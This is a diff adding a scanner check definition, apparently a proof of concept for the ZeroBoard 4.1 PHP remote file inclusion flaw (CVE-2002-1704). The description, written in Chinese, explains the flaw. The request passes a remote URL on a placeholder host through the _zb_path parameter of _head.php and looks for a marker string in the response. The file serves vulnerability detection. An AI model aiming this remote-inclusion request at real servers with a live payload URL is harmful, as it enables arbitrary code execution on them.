@@ -1,0 +1,37 @@
+[info]
+author = "ave"
+description = "验证 ZeroBoard 4.1 是否存在 PHP 远程文件包含漏洞。当 PHP 配置中 allow_url_fopen 与 register_globals 同时启用时，攻击者可通过 _head.php 脚本的 _zb_path 参数引入远程 URL，从而在服务器上执行任意 PHP 代码。本 PoC 发送包含远程 URL 的 _zb_path 参数请求，通过响应差异判断漏洞是否存在。"
+id = "POC-AVE-2002-0659"
+name = "ZeroBoard 4.1 PHP Include File Arbitrary Command Execution PoC"
+severity = "medium"
+tags = ["ave-2002-0659"]
+vuln_id = [
+    "CVE-2002-1704",
+    "AVE-2002-0659",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/_head.php"
+protocol = "http"
+query = "_zb_path=http://example.com/ave-poc-test.txt"
+
+[poc.requests.headers]
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = false
+status = [
+    200,
+    500,
+]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["AVE-POC-TEST-MARKER"]
